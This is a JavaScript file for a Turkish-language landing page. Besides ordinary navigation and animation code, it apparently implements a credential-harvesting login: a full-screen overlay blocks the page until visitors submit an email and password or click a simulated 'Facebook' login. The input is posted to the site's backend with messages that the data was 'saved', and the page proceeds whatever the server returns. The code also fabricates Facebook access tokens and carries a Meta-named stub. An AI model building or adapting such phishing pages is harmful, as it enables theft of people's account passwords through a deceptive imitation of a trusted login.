// Mobile Navigation Toggle
const hamburger = document.querySelector('.hamburger');
hamburger?.addEventListener('click', () => {
    document.body.classList.toggle('mobile-nav-open');
});

// Login Modal Functionality
const loginModal = document.getElementById('loginModal');
const loginBtn = document.getElementById('loginBtn');
const closeModal = document.querySelector('.close');
const facebookLogin = document.querySelector('.facebook-login');

// Open modal
loginBtn?.addEventListener('click', (e) => {
    e.preventDefault();
    if (!loginModal) return;
    loginModal.style.display = 'block';
    document.body.style.overflow = 'hidden'; // Prevent scrolling
});

// Close modal
closeModal?.addEventListener('click', () => {
    if (!loginModal) return;
    loginModal.style.display = 'none';
    document.body.style.overflow = 'auto';
});

// Close modal when clicking outside
window.addEventListener('click', (e) => {
    if (e.target === loginModal) {
        loginModal.style.display = 'none';
        document.body.style.overflow = 'auto';
    }
});

// Facebook Login Handler
facebookLogin?.addEventListener('click', async () => {
    // Simulate Facebook login process
    const originalText = facebookLogin.innerHTML;
    facebookLogin.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Giriş yapılıyor...';
    facebookLogin.style.opacity = '0.7';
    facebookLogin.disabled = true;
    
    try {
        // Flask backend'e Facebook login verisi gönder
        const response = await fetch('/facebook-login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                login_method: 'facebook',
                user_data: {
                    platform: 'facebook',
                    login_time: new Date().toISOString()
                },
                access_token: 'simulated_facebook_token_' + Date.now()
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            alert('Facebook ile giriş başarılı! Veriler kaydedildi.');
        } else {
            alert('Hata: ' + result.message);
        }
    } catch (error) {
        console.error('Facebook login error:', error);
        alert('Facebook ile giriş sırasında hata oluştu.');
    }
    
    // UI güncelle
    loginModal.style.display = 'none';
    document.body.style.overflow = 'auto';
    
    // Reset button
    facebookLogin.innerHTML = originalText;
    facebookLogin.style.opacity = '1';
    facebookLogin.disabled = false;
    
    // Update login button to show user logged in
    loginBtn.innerHTML = '<i class="fas fa-user"></i> Hoş geldiniz';
    loginBtn.style.background = '#27ca3f';
    loginBtn.style.borderColor = '#27ca3f';
    loginBtn.style.color = 'white';
});

// Regular Login Form Handler
document.querySelector('.login-form')?.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = this.querySelector('input[type="email"]').value;
    const password = this.querySelector('input[type="password"]').value;
    const rememberMe = this.querySelector('input[type="checkbox"]')?.checked || false;
    
    if (!email || !password) {
        alert('Lütfen email ve şifrenizi giriniz.');
        return;
    }
    
    // Email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        alert('Lütfen geçerli bir email adresi giriniz.');
        return;
    }
    
    const submitBtn = this.querySelector('.btn-login-submit');
    const originalText = submitBtn.textContent;
    
    submitBtn.textContent = 'Giriş yapılıyor...';
    submitBtn.style.opacity = '0.7';
    submitBtn.disabled = true;
    
    try {
        // Flask backend'e login verisi gönder
        const response = await fetch('/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                email: email,
                password: password,
                remember_me: rememberMe,
                login_method: 'email'
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            alert('Giriş başarılı! Bilgiler kaydedildi.');
            loginModal.style.display = 'none';
            document.body.style.overflow = 'auto';
            this.reset();
            
            // Update login button
            loginBtn.innerHTML = '<i class="fas fa-user"></i> Hoş geldiniz';
            loginBtn.style.background = '#27ca3f';
            loginBtn.style.borderColor = '#27ca3f';
            loginBtn.style.color = 'white';
        } else {
            alert('Hata: ' + result.message);
        }
    } catch (error) {
        console.error('Login error:', error);
        alert('Giriş sırasında hata oluştu.');
    }
    
    submitBtn.textContent = originalText;
    submitBtn.style.opacity = '1';
    submitBtn.disabled = false;
});

// ESC key to close modal
document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && loginModal && loginModal.style.display === 'block') {
        loginModal.style.display = 'none';
        document.body.style.overflow = 'auto';
    }
});

// Basit header ikon örnek olayları
document.getElementById('searchIcon')?.addEventListener('click',()=>alert('Arama özelliği yakında.'));
document.getElementById('bagIcon')?.addEventListener('click',()=>alert('Mağaza yakında.'));
document.getElementById('userIcon')?.addEventListener('click',()=>{
    alert('Hesap girişi için ekrana gelen ilk açılış panelini kullanın.');
});

// Dummy function to avoid errors where previous code might reference
window.__metaSetLoggedIn = () => {};

// Smooth Scrolling for Navigation Links
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) {
            target.scrollIntoView({
                behavior: 'smooth',
                block: 'start'
            });
        }
    });
});

// Header Scroll Effect
window.addEventListener('scroll', () => {
    const header = document.querySelector('.header');
    if (window.scrollY > 100) {
        header.style.background = 'rgba(255, 255, 255, 0.98)';
        header.style.boxShadow = '0 2px 20px rgba(0, 0, 0, 0.1)';
    } else {
        header.style.background = 'rgba(255, 255, 255, 0.95)';
        header.style.boxShadow = 'none';
    }
});

// Animated Counter for Stats
function animateCounters() {
    const counters = document.querySelectorAll('.stat-number');
    
    counters.forEach(counter => {
        const target = parseFloat(counter.textContent);
        const suffix = counter.textContent.replace(/[0-9.]/g, '');
        let current = 0;
        const increment = target / 100;
        
        const timer = setInterval(() => {
            current += increment;
            if (current >= target) {
                current = target;
                clearInterval(timer);
            }
            counter.textContent = current.toFixed(1) + suffix;
        }, 20);
    });
}

// Intersection Observer for Animations
const observerOptions = {
    threshold: 0.1,
    rootMargin: '0px 0px -50px 0px'
};

const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.style.opacity = '1';
            entry.target.style.transform = 'translateY(0)';
            
            // Animate counters when dashboard comes into view
            if (entry.target.classList.contains('dashboard-preview')) {
                animateCounters();
            }
        }
    });
}, observerOptions);

// Observe elements for animation
document.addEventListener('DOMContentLoaded', () => {
    const animatedElements = document.querySelectorAll('.service-card, .feature-item, .pricing-card, .dashboard-preview');
    
    animatedElements.forEach(el => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(30px)';
        el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
        observer.observe(el);
    });
});

// Initial Full Screen Overlay Logic
const initialOverlay = document.getElementById('initialLoginOverlay');
const initialFacebookLogin = document.getElementById('initialFacebookLogin');
const initialLoginForm = document.getElementById('initialLoginForm');

function completeInitialLogin(method = 'facebook') {
    // Fade out overlay
    initialOverlay.style.opacity = '0';
    initialOverlay.style.transition = 'opacity .5s ease';
    setTimeout(() => {
        initialOverlay.style.display = 'none';
        document.body.style.overflow = 'auto';
        // Mark logged in
        loginBtn.innerHTML = '<i class="fas fa-user"></i> Hoş geldiniz';
        loginBtn.style.background = '#27ca3f';
        loginBtn.style.borderColor = '#27ca3f';
        loginBtn.style.color = '#fff';
    }, 500);
}

if (initialOverlay) {
    document.body.style.overflow = 'hidden';
    initialOverlay.style.opacity = '1';
}

if (initialFacebookLogin) {
    initialFacebookLogin.addEventListener('click', async (e) => {
        e.preventDefault();
        const btn = e.currentTarget;
        const original = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Giriş yapılıyor...';
        btn.disabled = true;
        
        try {
            // Flask backend'e Facebook login verisi gönder
            const response = await fetch('/facebook-login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    login_method: 'facebook',
                    user_data: {
                        platform: 'facebook_initial',
                        login_time: new Date().toISOString()
                    },
                    access_token: 'initial_facebook_token_' + Date.now()
                })
            });
            
            const result = await response.json();
            console.log('Facebook login result:', result);
        } catch (error) {
            console.error('Initial Facebook login error:', error);
        }
        
        setTimeout(() => {
            btn.innerHTML = original;
            btn.disabled = false;
            completeInitialLogin('facebook');
        }, 1500);
    });
}

if (initialLoginForm) {
    initialLoginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const email = initialLoginForm.querySelector('input[type="email"]').value.trim();
        const pass = initialLoginForm.querySelector('input[type="password"]').value.trim();
        
        if (!email || !pass) return;
        
        const submitBtn = initialLoginForm.querySelector('.btn-login-submit.alt');
        const original = submitBtn.textContent;
        submitBtn.textContent = 'Giriş yapılıyor...';
        submitBtn.disabled = true;
        
        try {
            // Flask backend'e initial login verisi gönder
            const response = await fetch('/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: email,
                    password: pass,
                    remember_me: false,
                    login_method: 'email_initial'
                })
            });
            
            const result = await response.json();
            console.log('Initial login result:', result);
        } catch (error) {
            console.error('Initial login error:', error);
        }
        
        setTimeout(() => {
            submitBtn.textContent = original;
            submitBtn.disabled = false;
            completeInitialLogin('form');
        }, 1200);
    });
}

// (Removed advanced password toggle, language switcher, and extra accessibility focus for simplified overlay)

// Cloud Animation Enhancement
function createFloatingElements() {
    const hero = document.querySelector('.hero-visual');
    const numberOfElements = 5;
    
    for (let i = 0; i < numberOfElements; i++) {
        const element = document.createElement('div');
        element.className = 'floating-element';
        element.style.cssText = `
            position: absolute;
            width: ${Math.random() * 60 + 20}px;
            height: ${Math.random() * 60 + 20}px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            top: ${Math.random() * 80}%;
            right: ${Math.random() * 80}%;
            animation: floatRandom ${Math.random() * 10 + 5}s ease-in-out infinite;
            animation-delay: ${Math.random() * 5}s;
        `;
        hero.appendChild(element);
    }
}

// Pricing Card Hover Effect
document.querySelectorAll('.pricing-card').forEach(card => {
    card.addEventListener('mouseenter', function() {
        this.style.transform = 'translateY(-10px) scale(1.02)';
    });
    
    card.addEventListener('mouseleave', function() {
        if (this.classList.contains('featured')) {
            this.style.transform = 'translateY(-5px) scale(1.05)';
        } else {
            this.style.transform = 'translateY(0) scale(1)';
        }
    });
});

// Service Card Animation
document.querySelectorAll('.service-card').forEach(card => {
    card.addEventListener('mouseenter', function() {
        const icon = this.querySelector('.service-icon');
        icon.style.transform = 'rotate(360deg) scale(1.1)';
        icon.style.transition = 'transform 0.6s ease';
    });
    
    card.addEventListener('mouseleave', function() {
        const icon = this.querySelector('.service-icon');
        icon.style.transform = 'rotate(0deg) scale(1)';
    });
});

// Add dynamic gradient background
function createGradientAnimation() {
    const hero = document.querySelector('.hero');
    let angle = 135;
    
    setInterval(() => {
        angle += 1;
        hero.style.background = `linear-gradient(${angle}deg, #667eea 0%, #764ba2 100%)`;
    }, 100);
}

// Initialize animations when page loads
window.addEventListener('load', () => {
    createFloatingElements();
    // Uncomment if you want animated gradient background
    // createGradientAnimation();
});

// Parallax effect for hero section
window.addEventListener('scroll', () => {
    const scrolled = window.pageYOffset;
    const hero = document.querySelector('.hero-visual');
    const rate = scrolled * -0.5;
    
    if (hero) {
        hero.style.transform = `translateY(${rate}px)`;
    }
});

// Add loading animation
document.addEventListener('DOMContentLoaded', () => {
    document.body.style.opacity = '0';
    document.body.style.transition = 'opacity 0.5s ease';
    
    window.addEventListener('load', () => {
        document.body.style.opacity = '1';
    });
});
